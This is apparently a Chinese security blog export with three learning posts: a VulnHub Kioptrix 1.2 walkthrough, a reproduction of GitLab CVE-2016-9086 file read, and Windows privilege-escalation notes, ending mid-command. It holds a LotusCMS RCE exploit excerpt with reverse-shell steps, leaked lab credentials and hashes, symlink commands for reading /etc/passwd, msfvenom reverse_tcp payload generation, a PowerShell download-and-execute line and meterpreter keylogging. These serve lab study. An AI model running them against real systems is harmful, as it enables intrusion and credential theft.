最近也是学了内网一段时间，但比较迷茫，不知从哪里下手，甚至想考虑买课来学了，但是考虑到花钱-.-于是问了几个大佬说是先刷着内网靶场，在靶场中学习内网知识点，比如vulnhub，暗月靶场等等。还是那句话，即使迷茫也不要停下学习的脚步，说不定就恍然大悟了。。。 话不多说，开始本人vulnhub靶场的刷题之旅 0x02 靶场环境 攻击机（kali）：192.168.17.137 靶机下载地址：https://www.vulnhub.com/entry/kioptrix-level-12-3,24/ kali 与靶机为同种网络模式（此处均为 NAT 模式） 这里也是花了老长时间，我以为搭建也需要技术呢，搜了半天发现也没人说如何搭建，只是说攻击机与靶机一定要在同一ip段下，我也是直接下载后用vm虚拟机直接打开文件夹里的vmx文件，接着换为NAT模式，打开之后发现还要登录，我寻思密码呢？想了一下，说不定这个密码就是我们要获取的。先做着试试看 0x03 靶场渗透 3.1 信息搜集 当然我们此时要清楚渗透流程，当然第一步就是信息搜集—这也是第一次实战，肯定大部分都是wp看的，质量肯定低（呜呜，太菜了~~） 这里跟着wp将流程好好熟悉一下，下次打的时候争取少看wp！！！—争取命令都是手敲 探测存活主机 netdiscover -r 192.168.17.0/24 ![image-20230923191442890](kioptrix_level 1.2/image-20230923191442890.png) 这里搜集了四个emmm，盲猜就是第三个，毕竟剩余三个很奇怪 端口扫描 nmap -sS -sV -A -p 1-65535 192.168.17.143 顺便熟悉一下nmap命令的参数细节 – 抓常用的 1.扫描单个目标地址 nmap 192.168.0.107 2.扫描多个目标地址，如果目标地址不在同一网段，或在同一网段但不连续且数量不多，可以使用该方法进行扫描。 nmap 192.168.0.100 192.168.0.107 3.扫描一个范围内的目标地址 nmap 192.168.0.100-110 可以指定扫描一个连接的网段，中间使用“-”连接 4.扫描目标地址所在的某个网段 以C段为例，如果目标是一个网段，则可以通过添加子网掩码的方式扫描，下列命令表示扫描范围为：192.168.0.1-182.168.0.255 nmap 192.168.0.0/24 5.扫描主机列表targets.txt中所有目标的地址 nmap -iL C:\\Users\\targets.txt -iL 从文件中导入目标主机或者目标网段 //同一目录下可以不用绝对路径 6.扫描除某一个目标地址之外的所有目标地址 nmap 192.168.0.100/24 -exclude 192.168.0.107 //-exclude:后面跟的主机或网段将不在扫描的范围内 7.扫描除某一个文件中的目标地址之外的目标地址 nmap 192.168.0.100/24 -excludefile C:\\Users\\targets.txt //-excludefile 导入文件中的主机或网段将不在扫描范围内 8.扫描某一个目标地址的21，22，23，80端口 如果不需要对目标主机进行全端口扫描，只想探测它是否开启某一端口，那么使用-p参数指定端口号，将大大提高扫描速度。 nmap 192.168.0.107 -p 21,22,23,80 //-p指定端口 9.对目标地址进行路由攻击 nmap --traceroute 192.168.0.10 //--traceroute 追踪每个路由节点 10.扫描目标地址所在的C段的在线状态 nmap -sP 192.168.0.107/24 nmap -sn 192.168.0.107/24 //这个两个命令都是进行主机发现，-sP/-sn 关闭主机扫描 实现ping 功能 11.对操作系统指纹的识别 nmap -O 192.168.0.107 //-O 对操作系统指纹的识别 12.目标地址提供的服务版本检测 nmap -sV 192.168.0.107 //-sV 让nmap进行版本探测 13.探测防火墙状态 nmap -sF -T4 192.168.0.107 //-sF进行FIN探测 -T -T4指定扫描过程使用的时序，总共有6个级别（0-5）级别越高扫描速度越快，但是也容易被防火墙检测并屏蔽掉，在网络情况较好的是可以使用T4 剩下的就是命令组合的了 具体可参考：nmap常用命令详细使用|命令带实例 --这里简单过一下，日后用的时候看着用，熟练就好了 ![image-20230923192950046](kioptrix_level 1.2/image-20230923192950046.png) 扫到如上信息，接着看一下靶机附带文件给的信息 ![image-20230923193028820](kioptrix_level 1.2/image-20230923193028820.png) 这里没咋懂他的意思，估计是修改域名解析吧，我们看看wp wp：按提示添加 host 记录到攻击机：sudo nano /etc/hosts 没用过这个命令，所以我用vim了vim /etc/hosts，添加内容：192.168.17.143 kioptrix3.com ![image-20230923193441839](kioptrix_level 1.2/image-20230923193441839.png) 这里新kali没dirsearch，等我下载一下，这里又看到一个小tip 192.168.233.1 vm8网卡 192.168.233.2 网关 192.168.233.177 靶机 192.168.233.254 DHCP服务器 故此我们猜的是对的 web目录扫描 使用 dirsearch 进行目录扫描：dirsearch -u http://kioptrix3.com -x 400-599 -t 50 此处-x是为了排除页面400-599的状态码回显，-t为设置线程数，不过似乎不设置 hosts直接扫ip也可以吧，但说不定后续有用？ ![image-20230923194338037](kioptrix_level 1.2/image-20230923194338037.png) 访问了一下，发现已经有了web网站了，我们看一下扫出的结果，一个个访问看看有什么想信息 [19:43:15] 200 - 2KB - /cache/ [19:43:15] 301 - 353B - /cache -&gt; http://kioptrix3.com/cache/ [19:43:18] 200 - 688B - /core/fragments/moduleInfo.phtml [19:43:18] 301 - 352B - /core -&gt; http://kioptrix3.com/core/ [19:43:23] 200 - 23KB - /favicon.ico [19:43:24] 301 - 355B - /gallery -&gt; http://kioptrix3.com/gallery/ [19:43:27] 200 - 2KB - /index.php [19:43:27] 200 - 2KB - /index.php/login/ [19:43:33] 200 - 2KB - /modules/ [19:43:33] 301 - 355B - /modules -&gt; http://kioptrix3.com/modules/ [19:43:37] 301 - 358B - /phpmyadmin -&gt; http://kioptrix3.com/phpmyadmin/ [19:43:38] 200 - 8KB - /phpmyadmin/ [19:43:38] 200 - 8KB - /phpmyadmin/index.php [19:43:46] 301 - 353B - /style -&gt; http://kioptrix3.com/style/ [19:43:49] 200 - 18B - /update.php ![image-20230923194820587](kioptrix_level 1.2/image-20230923194820587.png) 访问了一下，直接用admin就登进去了 ![image-20230923194938034](kioptrix_level 1.2/image-20230923194938034.png) 不过似乎没啥信息，接着看了update.php，发现无权访问，这里肯定有问题 ![image-20230923195108757](kioptrix_level 1.2/image-20230923195108757.png) 接着看了modules目录，展示了此网站目录结构 ![image-20230923195459051](kioptrix_level 1.2/image-20230923195459051.png) 总的来说，没啥思路了┭┮﹏┭┮，看wp吧 web网站指纹扫描 针对 web 页面进行信息搜集，使用 whatweb 扫描网站信息：whatweb http://kioptrix3.com ![image-20230923200117955](kioptrix_level 1.2/image-20230923200117955.png) 发现关键词，lotusCMS，直觉告诉我此处必有漏洞，搜了一番发现此系统有一个RCE漏洞，直接将其exp先下载一下，接着看看网站那里存在CMS ![image-20230923200516077](kioptrix_level 1.2/image-20230923200516077.png) 在访问后页面有个login点击发现，此登录功能采用的就是上述CMS，看了wp有如下思路 通过 searchsploit 查询此 CMS 相关漏洞：searchsploit lotuscms ![image-20230923200651665](kioptrix_level 1.2/image-20230923200651665.png) 恰好跟我搜的RCE对上了，接着wp说：查找到存在 RCE 但是需要用到 MSF，为贴近 OSCP 考试，尽量不使用 MSF，上网查询是否存在其他 exp 代码，好好好~~这么玩是吧，那我紧跟佬的步伐0.o 这是佬的搜索方法 ![image-20230923200828274](kioptrix_level 1.2/image-20230923200828274.png) 我也附上exp链接：https://github.com/Hood3dRob1n/LotusCMS-Exploit 3.2 漏洞利用 lotusCMS-RCE 将其下载到攻击机并赋予可执行权限：这里我直接将zip拖进kali了 ![image-20230923201145279](kioptrix_level 1.2/image-20230923201145279.png) #!/bin/bash # Lotus CMS 3.0 eval() Remote Command Execition Exploit # flaw in router() function, original write-up: http://secunia.com/secunia_research/2011-21/ # Scripted in Bash by HR # USAGE: ./lotusRCE.sh target lotusCMS-path # USAGE: ./lotusRCE.sh ki0ptrix3.com / # USAGE: ./lotusRCE.sh 192.168.1.36 /lcms/ # Enter IP and PORT when asked to spawn netcat based reverse shell ;) #Start the magic target=\"$1\" #Target site, ex: 192.168.1.36 or ki0ptrix3.com (no http://) path=\"$2\" # Path to LotusCMS, ex: /lcms/ or / junk=/tmp storage1=$(mktemp -p \"$junk\" -t fooooobar1.tmp.XXX) storage2=$(mktemp -p \"$junk\" -t fooooobar2.tmp.XXX) 此处为代码的用法，可以看出是要反弹shell的。 先新建窗口建立起 nc 监听：nc -lvnp 4444 然后运行 exp 代码：./lotusRCE.sh kioptrix3.com / 运行后按提示输入用于接收反弹 shell 的 IP 和端口，并选择反弹方式： ![image-20230923201445552](kioptrix_level 1.2/image-20230923201445552.png) ![image-20230923201609119](kioptrix_level 1.2/image-20230923201609119.png) 选择反弹方式 1 之后，nc 收到反弹 shell，权限为 www-data： ![image-20230923201646856](kioptrix_level 1.2/image-20230923201646856.png) 使用 Python 建立 TTY Shell：python -c 'import pty;pty.spawn(\"/bin/bash\");' 翻一下目录尝试搜集有效信息，在当前位置下的 /gallery 文件夹下发现存在疑似配置文件 gconfig.php： ![image-20230923201913897](kioptrix_level 1.2/image-20230923201913897.png) 读取看一下，发现存在数据库的配置信息 ![image-20230923202004834](kioptrix_level 1.2/image-20230923202004834.png) $GLOBALS[\"gallarific_mysql_server\"] = \"localhost\"; $GLOBALS[\"gallarific_mysql_database\"] = \"gallery\"; $GLOBALS[\"gallarific_mysql_username\"] = \"root\"; $GLOBALS[\"gallarific_mysql_password\"] = \"fuckeyou\"; 存一下，接着想到了phpmyadmin，我们登陆看看，这里也是震惊了，之前我只用 admin登录，现在用上述给的账号密码登录，页面回显竟然不一样。。。 ssh登录用户 ![image-20230923202247609](kioptrix_level 1.2/image-20230923202247609.png) 接着发现了两处用户信息 dev_accounts 表中的用户信息： dreg 0d3eccfb887aabd50f243b3f155c0f85 loneferret 5badcaf789d3d1d09794d8f021f40f0e gallarific_users表中的信息： admin n0t7t1k4 superuser 这里用md5解密看看，上述dev表解密的信息为： Mast3r 与 starwars 接着前往之前的登录页面看看，发现上述三个都登录不上，接着wp说 换 ssh 登录，dreg、loneferret 可成功登录。 这里dreg用户没有信息，登录另一个即可。 接着佬又开始漏洞挖掘了，访问 http://kioptrix3.com/gallery/ 进行漏洞挖掘： ![image-20230923203825517](kioptrix_level 1.2/image-20230923203825517.png) 如图我发现点击每个链接，页面都会回显一些18禁的内容。。。。。。我真被震惊到了，估计是题目现在出问题了？，于是我还是直接访问答案吧。 点击页面 Ligoat Press Room 进入新页面，左下角有排序选项框，任选之后发现 url 出现了 id 参数：（但我根本点不了） ![image-20230923204011375](kioptrix_level 1.2/image-20230923204011375.png) 将此 url 丢到 sqlmap 进行测试： sqlmap -u \"http://kioptrix3.com/gallery/gallery.php?id=1\" ![image-20230923204344017](kioptrix_level 1.2/image-20230923204344017.png) 如图发现存在sql注入，接着爆数据库，表名等等，不过猜测爆出来的就是刚刚RCE得到的 利用sqlmap得到数据库名：sqlmap -u \"http://kioptrix3.com/gallery/gallery.php?id=1\" --dbs sqlmap -u \"http://kioptrix3.com/gallery/gallery.php?id=1\" -D gallery --tables --batch sqlmap -u \"http://kioptrix3.com/gallery/gallery.php?id=1\" -D gallery -T dev_accounts --columns --batch sqlmap -u \"http://kioptrix3.com/gallery/gallery.php?id=1\" -D gallery -T dev_accounts -C username,password --dump --batch ![image-20230923204513242](kioptrix_level 1.2/image-20230923204513242.png) ![image-20230923204602653](kioptrix_level 1.2/image-20230923204602653.png) ![image-20230923204728931](kioptrix_level 1.2/image-20230923204728931.png) 最终得到用户名和密码 sudo权限提升 查看 loneferret 用户，家目录下存在两个文件，可执行脚本 checksec.sh 是逆向中用于检测目标文件使用了哪些防护技术的，在 CompanyPolicy.README 文件中找到提示信息，要运行命令：sudo ht 这里我采用的finalshell连接ssh，佬是用kali的 ht 编辑器使用说明：https://www.aldeid.com/wiki/HT-Editor 按 F3 调出文件窗口，输入 /etc/sudoers 回车进行编辑： ![image-20230923205039949](kioptrix_level 1.2/image-20230923205039949.png) 不过这似乎不得不kali了，不过让我崩溃的是kali的ssh功能竟然报错，信息如下 Unable to negotiate with 192.168.17.143 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss 搜寻一番发现此文章或许可以解决：[SSH 返回：未找到匹配的主机密钥类型。他们的报价：ssh-dss ![image-20230923211220504](kioptrix_level 1.2/image-20230923211220504.png)成功链接，接着sudo ht ![image-20230923211256972](kioptrix_level 1.2/image-20230923211256972.png) 但却报错了，信号这位佬也跟我一样： 运行出现报错提示：Error opening terminal: xterm-256color. 查询是新版 kali 的终端配色过于先进，降级一下：export TERM=xterm-color 验证一下 sudo 权限： ![image-20230923211513202](kioptrix_level 1.2/image-20230923211513202.png) 发现 su 和 ht 具有 root 权限，尝试运行 su 命令失败，无法直接切换至 root 用户。 再次运行：sudo ht ![image-20230923211416068](kioptrix_level 1.2/image-20230923211416068.png) ht 编辑器使用说明：https://www.aldeid.com/wiki/HT-Editor 按 F3 调出文件窗口，输入 /etc/sudoers 回车进行编辑： ![image-20230923211552544](kioptrix_level 1.2/image-20230923211552544.png) 将原有 loneferret 条目修改为：loneferret ALL=(ALL) ALL ![image-20230923211709870](kioptrix_level 1.2/image-20230923211709870.png) 修改完毕按 F2 保存，然后按 F10 退出，回到终端后运行命令：sudo su -（输入 loneferret 密码 starwars） ![image-20230923211824238](kioptrix_level 1.2/image-20230923211824238.png) 成功获取root权限，在该目录下找flag即可 ![image-20230923212349728](kioptrix_level 1.2/image-20230923212349728.png) 但没想到这就是 flag，emmm 0x04 总结 回顾一下此次渗透路程：进到内网之后，首先就是扫描主机存活，随后针对某个主机展开渗透，然后呢先进行简单却关键的信息搜集，如端口扫描，找到可以端口便可以扫一下web网站的目录，看看网站中会存在哪些常见漏洞。 当然在此期间也要对web网站做好信息搜集，比如用的什么中间件，采用的何种CMS等等，更要学会在搜集到可疑信息后，可疑在百度，google，gihub等处找到合适的exp等漏洞利用手段。 找到之后无非就是想要获取一些重要数据，比如账号密码之类的，这会成为后续ssh连接的重要手段。 当我们成功获取靶机shell时，肯定就是要想办法提权，因为不可能运气爆棚直接就是最高权限，而我们渗透的最终目的就是拿下靶机的最高权限。在此期间可能就要充足的技术去知道利用何种技术去提权，做免杀等等。 此次渗透旅程让我受益颇丰，再接再厉，希望日后可以靠自己的脑子，走的更远。 不过话又说回来了，我得去学一下sudo提权了，感觉在此处的理解不够深刻。我们换一篇文章探讨！ 0x05 参考文章 VulnHub渗透测试实战靶场 - KIOPTRIX: LEVEL 1.2 [vulnhub靶场Kioptrix: Level 1.2 (#3) ] Kioptrix: Level 1.2","tags":["内网靶场"],"categories":["vulnhub系列"]},{"title":"Gitlab 任意文件读取漏洞（CVE-2016-9086）","path":"/2023/09/20/gitlab-ren-yi-wen-jian-du-qu-lou-dong-cve-2016-9086/","content":"0x01 漏洞概述 GitLab 是一个利用 Ruby on Rails 开发的开源应用程序，实现一个自托管的 Git 项目仓库，可通过 Web 界面进行访问公开的或者私人项目。近日研究者发现在其多个版本中存在文件读取漏洞 (CVE-2016-9086) 和 任意用户 authentication_token 泄漏漏洞，攻击者可以通过这两个漏洞来获取管理员的权限，进而控制所有 gitlab 项目。 影响版本： **任意文件读取漏洞 (CVE-2016-9086)：**GitLab CE/EEversions 8.9, 8.10, 8.11, 8.12, and 8.13 **任意用户 authentication_token 泄露漏洞：**Gitlab CE/EE versions 8.10.3-8.10.5 0x02 漏洞分析 这里跟着佬的思路走一次，搞清漏洞发生原因即可 从 8.9.0 版本开始，GitLab 新增了导入导出项目的功能。一个空的 gitlab 项目导出后结构如下： VERSION # GitLab 的导出模块的版本 project.json # 包含了项目的配置文件 当我们导入 GitLab 的导出文件的时候，GitLab 会按照如下步骤处理： 服务器根据 VERSION 文件内容检测导出文件版本，如果版本符合，则导入。 服务器根据 Project.json 文件创建一个新的项目，并将对应的项目文件拷贝到服务器上对应的位置。 检测 VERSION 文件的代码位于：/lib/gitlab/import_export/version_checker.rb中： ... def check! version = File.open(version_file, &amp;:readline) #version变量将包含文件的第一行内容。 verify_version!(version) rescue =&gt; e shared.error(e) false end ... def verify_version!(version) if Gem::Version.new(version) != Gem::Version.new(Gitlab::ImportExport.version) raise Gitlab::ImportExport::Error.new(\"Import version mismatch: Required #{Gitlab::ImportExport.version} but was #{version}\") else true end end ... ​ 我们可以看到这里的逻辑是读取 VERSION 文件的第一行赋值给变量 version，然后检测 verison 与当前版本是否相同，相同返回 true，不相同则返回错误信息 (错误信息中包括变量 version 的值). 于是漏洞发现者 Jobert Abma 巧妙的使用了软链接来达到读取任意文件的目的。首先，我们给 VERSION 文件加上软链接并重新打包。 ln -sf /etc/passwd VERSION tar zcf change_version.tar.gz ./ ln：这是创建链接的命令。 -sf：这是ln命令的选项： -s 表示创建符号链接，即软链接。 -f 表示如果已存在名为VERSION的链接文件，则强制覆盖它，即使它已经存在。 /etc/passwd：这是源文件的路径，即要创建软链接的目标文件是/etc/passwd。 VERSION：这是要创建的软链接的名称，它将链接到/etc/passwd文件。 这样，读取 VERSION 文件的时候服务器就会根据软链接读取到 /etc/passwd 的第一行内容并赋值给 version。但是由于 version 与当前版本不相同，所以会输出 version 的值，也就是 /etc/passwd 第一行的内容。 **但是，如果只读取任意文件的第一行，能做的事情还是太少了。漏洞发现者显然不满足这一结果，他继续找了下去.**读取 Project.json 这一配置文件的代码位于：/lib/gitlab/import_export/project_tree_restorer.rb 中： ... def restore json = IO.read(@path) tree_hash = ActiveSupport::JSON.decode(json) project_members = tree_hash.delete('project_members') ActiveRecord::Base.no_touching do create_relations end rescue =&gt; e shared.error(e) false end ... 在这里，我们可以再次使用软链接使变量 json 获取到任意文件的内容，但是由于获取的文件不是 json 格式，无法 decode，导致异常抛出，最终在前端显示出任意文件的内容。 添加软链接并打包: ln -sf /etc/passwd project.json tar zcf change_version.tar.gz ./ 佬的思路就是完美 0x03 漏洞复现 docker一键部署后访问8080端口，环境运行，ssh 端口为 10022。访问 http://your-ip:8080，设置管理员（用户名 root）密码，登录。 默认管理员帐户的凭据为root和vulhub123456。 ![image-20230920204243371](Gitlab 任意文件读取漏洞（CVE-2016-9086）/image-20230920204243371.png) 这里新注册一个用户并登录，进入该页面后点击右上角的+号 ![image-20230920204911687](Gitlab 任意文件读取漏洞（CVE-2016-9086）/image-20230920204911687.png) 新建一个项目，点击 GitLab export： ![image-20230920204940165](Gitlab 任意文件读取漏洞（CVE-2016-9086）/image-20230920204940165.png) 上传文件test.tar.gz，文件/etc/passwd内容会显示出来： ![image-20230920205141629](Gitlab 任意文件读取漏洞（CVE-2016-9086）/image-20230920205141629.png) ![image-20230920205157712](Gitlab 任意文件读取漏洞（CVE-2016-9086）/image-20230920205157712.png) 0x04 漏洞修复 官方先移除了导入包里的软连接，其次，读取 VERSION 的内容和 project.json 的内容出错后将内容输出到日志里而非返回到前端。 具体可以参考一下文章。 0x05 参考文章 Gitlab 任意文件读取漏洞复现 GitLab 任意文件读取漏洞 (CVE-2016-9086) 和任意用户 token 泄露漏洞 GitLab 任意文件泄露 (CVE-2016-9086)","tags":["CVE"],"categories":["CVE漏洞"]},{"title":"Windows提权学习一","path":"/2023/09/19/windows-ti-quan-xue-xi-yi/","content":"0x01 基础知识 提权的思路最重要的就是信息收集,我们只有对整个系统进行了较全面的信息收集,大概对整个系统有了一定的了解后,我们才能高效且精准的完成提权 比方说:我们收集到这个系统是windows-sever2003的系统和里面的一些相关配置我们能联想到什么提权方法呢? 是不是可以先利用自动化工具(msf和cs)先去尝试–&gt;针对低版本的系统命令–&gt;进程迁移–&gt;令牌窃取–&gt;dll劫持–&gt;不安全的服务–&gt;手工提权这么一个流程 1.1 提权基础命令 # 查询系统信息 systeminfo # 如果要查看特定的信息，可以使用 systeminfo | findstr /B /C:\"OS名称\" /C:\"OS版本\" # 主机名 Hostname # 环境变量 Set # 查看用户信息 Net user # 查看服务 pid 号 tasklist /svc|find \"TermService\" netstat -ano|find \"3389\" # 查看系统名 wmic os get caption # 查看补丁信息 wmic qfe get Description,HotFixID,InstalledOn # 如果要定位到特定的补丁可以使用如下命令 wmic qfe get Description,HotFixID,InstalledOn | findstr /C:\"KB4346084\" /C:\"KB4509094\" # 查看当前安装程序 wmic product get name,version 其中需要注意一下 环境变量，因为有的软件环境变量可能设置在其它路径中，而在该路径下的文件是具有写权限的，就可以通过替换文件来达到提权操作 这里的命令在windows信息搜集都有的 1.2 Windows 权限划分 User：普通用户权限，系统中最安全的权限，分配给该组的默认权限不允许成员修改操作系统的设置或用户资料 Administrator：管理员权限，可以利用 Windows 的机制将自己提升为 System 权限，以便操作 SAM 文件等 System：系统权限，可以对 SAM 等敏感文件进行读取，往往需要 Administrator 权限提升到 System 权限才可以对散列值进行 Dump 操作 TrustedInstaller：最高权限， 对于系统文件，即使 System 权限也无法进行修改，只有 TrustedInstaller 权限才可以修改文件 1.3 常见 webshell 所处的权限 通常的 webshell 权限如下： ASP、PHP - 匿名权限 ASPX - user 权限 JSP - 通常是系统权限 1.4 权限提升分类 纵向提权：低权限用户获得高权限角色的权限。 横向提权：获得同级别角色的权限。 常用的提权方法有Windows系统内核溢出漏洞提权、错误的系统配置提权、数据库提权等等。下面我们对常用的几种提权的方法进行逐一演示。 0x02 系统内核溢出漏洞提权 ​ 溢出漏洞是一种计算机程序的可更正性缺陷。溢出漏洞的全名：缓冲区溢出漏洞。因为它是在程序执行的时候在缓冲区执行的错误代码，所以叫缓冲区溢出漏洞。缓冲溢出是最常见的内存错误之一，也是攻击者入侵系统时所用到的最强大、最经典的一类漏洞利用方式。成功地利用缓冲区溢出漏洞可以修改内存中变量的值，甚至可以劫持进程，执行恶意代码，最终获得主机的控制权。 ​ 利用Windows系统内核溢出漏洞提权是一种很通用的提权方法，攻击者通常可以使用该方法绕过系统中的所有安全限制。攻击者利用该漏洞的关键是目标系统有没有及时安装补丁，如果目标系统没有安装某一漏洞的补丁且存在该漏洞的话，攻击者就会向目标系统上传本地溢出程序，溢出Administrator权限。 下面演示提权过程。 2.1 手动查找系统潜在漏洞 获取目标主机的一个普通用户的shell后，执行如下命令，查看目标系统上安装了那些补丁： systeminfo 或 wmic qfe get caption,description,hotfixid,installedon 可以看到系统就装了这几个补丁。攻击者会通过没有列出的补丁号，寻找相应的提权EXP，例如KiTrap0D和KB979682对应、MS10-021和KB979683对应等等。然后使用目标机上没有的安装的补丁号对应的EXP进行提权。Windows不同系统提权的漏洞和相应的补丁请见：点我呀。 2.2 自动查找系统潜在漏洞 方法一：Windows Exploit Suggester 下载地址：https://github.com/GDSSecurity/Windows-Exploit-Suggester 该工具可以将系统中已经安装的补丁程序与微软的漏洞数据库进行比较，并可以识别可能导致权限提升的漏洞，而且其只需要我们给出目标系统的信息即可。 使用如下： 首先更新漏洞数据库，会生成一个xls的文件，如下 2023-09-20-mssb.xls 这里有个小问题，首先下载好zip更新了数据库之后，需要安装一个依赖，依赖项目中有说明，之后更新数据库按理来说，更新的文件后缀应为xls，可我这里是xlsx，如果直接用xlsx则会报错（以上是我在虚拟机的情况），我们可以在本地更新后打开另存为xls，具体呢推荐如下图所示的格式 其他形式还未尝试，大家感兴趣可以测试 注意必须为python2环境 然后执行如下命令，查看目标主机系统信息，保存为sysinfo.txt文件： systeminfo &gt; sysinfo.txt 最后，运行如下命令，查看该系统是否存在可利用的提权漏洞： python2 windows-exploit-suggester.py -d 2020-08-20-mssb.xls -i sysinfo.txt 如上图，执行后，给出了一些目标系统存在的漏洞 方法二：local_exploit_suggester 模块 Metasploit内置模块提供了各种可用于提权的local exploits，并会基于架构，平台（即运行的操作系统），会话类型和所需默认选项提供建议。这极大的节省了我们的时间，省去了我们手动搜索local exploits的麻烦。 使用如下，假设我们已经获得了目标主机的一个session： use post/multi/recon/local_exploit_suggester set session 1 exploit 这里我就搜了篇文章，对win7靶机获取一下其session 小tip：后渗透之获取普通session 所需环境：1.kali Linux（攻击机） 2.windows7（靶机） 在kali终端中打开msfconsole控制台 开启监听 use exploit/multi/handler 设置tcp监听 set payload windows/meterpreter/reverse_tcp Linux： msfvenom -p linux/x64/meterpreter/reverse_tcp lhost= lport= -f elf &gt; shell.elf Windows: 32 位：msfvenom -p windows/meterpreter/reverse_tcp lhost= lport= -f exe &gt; shell.exe 64 位：msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.17.128 lport=4444 -a x64 -f exe &gt; shell.exe 说明：-p payload(有效载荷) 通俗的讲payload是用来建立目标机与攻击机稳定连接的，可以返回shell -e 编码方式 -i 编码次数 -b 在生成的程序中避免出现的值 -f exe 生成exe格式 msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.17.137 lport=4444 -f exe &gt; shell.exe 不过操作下来，发现没必要非得写64位对应的命令，反而这个命令还报错，不知是否为我的失误 4.将该shell文件上传到靶机中。在kali控制台下使用python 环境执行命令：python -m SimpleHTTPServer 800搭建一个http服务，提供一个web页面供靶机浏览。(一定是在管理员模式下执行此命令 (sudo su)) 不过这里不用搞800,默认端口即可 值得注意的是python2才可以 打开目标机win7，输入地址进行下载木马并保存在桌面 上图为下载的回显，返回第二步界面，设置监听主机，运行 可以看到得到了session ​ 查看session，如果此时是meterpreter，输入background即可返回msf exploit(multi/handler) 查看系统信息:sysinfo 截取时下桌面:screenshot 捕获击键记录:keyscan start 控制键盘鼠标 启用/禁用:uictl enable/disable keyboard 参考文章：msf 获取一个普通的session 控制windows 接上回，我们已经获得了目标主机的一个session： use post/multi/recon/local_exploit_suggester set session 1 exploit 这里也有个小坑，必须要在同一终端下，将msf先挂个后台，通过background，随后在执行上述命令 这里也是发现了二十几个，该模块快速识别并列出了系统中可能被利用的漏洞，十分方便。但虽然如此，也并非所有列出的local exploits都可用。 方法三：enum_patches 模块 会用metasploit中的post/windows/gather/enum_patches模块可以根据漏洞编号快速找出系统中缺少的补丁。使用如下： use post/windows/gather/enum_patches set session 1 exploit 这里不在演示了，同上述步骤即可 在实际的查找潜在漏洞的过程中，建议手动和自动双管齐下。 下载地址：https://github.com/rasta-mouse/Sherlock 该脚本可以快速的查找出可能用于本地权限提升的漏洞。使用如下： powershell -exec bypass -c IEX(New-Object Net.WebClient).DownloadString('http://ip/Sherlock.ps1'); // 远程执行 #导入模块 Import-Module .\\Sherlock.ps1 #如果提示未能加载指定模块，则可能是权限问题，以管理员权限运行powershell，然后输入如下代码 Set-ExecutionPolicy Unrestricted #输入如下命令可以查看帮助信息 powercat -h Find-AllVulns // 调用脚本后，执行搜索命令 这里总是报错，我就下载到本地了，这里搜索的时间较长，耐心等待 2.3 选择漏洞并利用 查找了目标机器上的补丁并确定存在漏洞后，我们就可以像目标机器上传本地溢出程序，并执行。这里，我们选择的是CVE-2018-8120。 漏洞利用程序可以从以下几个地址中下载：（里面附有使用说明） Windows 下的提权大合集：https://github.com/lyshark/Windows-exploits Windows内核溢出漏洞提权大全：https://github.com/SecWiki/windows-kernel-exploits 各大平台提权工具：https://github.com/klsfct/getshell 这里下载的时候注意将exe文件放入相应目录在执行如上命令 如上图，再执行提权程序之前，为普通用户whoami权限，执行后为system权限。msfconsole上完整操作如下： 这里尝试了多个漏洞，但似乎是我的用法不正确（而且我也不知道如何用）导致在此环境下whoami一直为普通用户 但奇怪的是每次执行命令之后，靶机都会自动跳转一个以管理员身份打开的cmd 但可能为另一种情况，就是其目标就是让靶机提权，但或许反应不到msf上，这里我对内网渗透了解较少，可能理解有问题吧，先过个思路。 不过在突然看到靶机中有了相应的exp，我便知道了，upload就会将该 exp由攻击者下载到靶机处，接着执行该 exe 文件，执行后便也就是提权了，即也是为何最后出现system cmd的原因吧，但仍不理解的是为何msf的whoami没有显示管理员权限 0x03 系统错误配置漏洞提权 在Windows系统中，攻击者通常会通过系统内核溢出漏洞来提权，但是如果碰到无法通过系统内核溢出漏洞提权的情况时，会可以利用系统中的错误配置漏洞来提权。下面演示几种常见的Windows系统错误配置漏洞提权方法。 Trusted Service Paths漏洞（可信任服务路径漏洞） Trusted Service Paths 漏洞是由系统中的“CreateProcess”函数引起的，并利用了windows文件路径解析的特性。 首先，我们来认识一下Windows中文件路径解析的特性。例如，我们有一个文件路径为“C:\\Program Files\\Some Folder\\Service.exe”。那么，对于该路径中的每一个空格，Windows都会尝试寻找并执行与空格前面的名字相匹配的程序。如上面的目录为例，Windows会依次尝试确定和执行一下程序： 1. C:\\Program.exe 2. C:\\Program Files\\Some.exe 3. C:\\Program Files\\Some Folder\\Service.exe 可见，最后才确定并执行真正的程序Service.exe。而由于Windows服务通常是以system权限运行的，所以系统在解析服务所对应的文件路径中的空格时，也会以system系统权限进行，那么，如果我们将一个“适当命名”的可执行程序上传到以上所说的受影响的目录中，服务一旦启动或重启，该程序就会以system权限运行了，可见该漏洞利用了服务路径的文件/文件夹的权限。 该漏洞是由于一个服务的可执行文件没有正确的处理所引用的完整路径名，即一个服务的可执行文件的完整路径中含有空格且没有被双引号引起来，那么该服务就存在这个漏洞。下面演示该漏洞利用方法。 首先，我们可以用以下命令列出目标主机中所有存在空格且没有被引号括起来服务路径： wmic service get name,displayname,pathname,startmode|findstr /i \"Auto\" |findstr /i /v \"C:\\Windows\\\\\" |findstr/i /v \"\"\" 我的靶机都没有此漏洞，也有点懒不想费时间搭了，因此跟着过一遍思路吧 如上图，可以看到“whoami”和“Bunny”这两个服务对应的二进制文件路径没有引号包含起来，并且路径中包含空格。是存在该漏洞的，但在上传可执行文件进去之前，我们需要确定我们对目标文件夹是否有写入的权限。 这里我们使用Windows中的icacls命令，依次来检查“C:\\”、“C:\\Program Files\\Program Folder”等目录的权限发现只有“C:\\Program Files\\program folder”目录有Everyone(OI)(CI)(F)： 参数说明： “M”表示修改 “F”代表完全控制 “CI”代表从属容器将继承访问控制项 “OI”代表从属文件将继承访问控制项。 这就意味着对该目录有读，写，删除其下的文件，删除该目录下的子目录的权限。 确认目标机器中存在此漏洞后，把要上传的程序重命名并放置在存在此漏洞且可写的目录下，执行如下命令，尝试重启服务。 sc stop &lt;service_name&gt; sc start &lt;service_name&gt; 既然要重启服务，那么我们就可以知道，该提权方法需要管理员权限，重启服务的方法适用于从管理员权限到system的权限提升过程。而实际情况下，我们直接对目标主机执行“shutdown -r -t 0”命令让他重启就行了。 我们生成一个msf马并重命名为Hello.exe上传到该“C:\\Program Files\\Program Folder”目录下，然后分别执行如下命令重启该WhoamiTest服务： sc stop WhomaiTest sc start 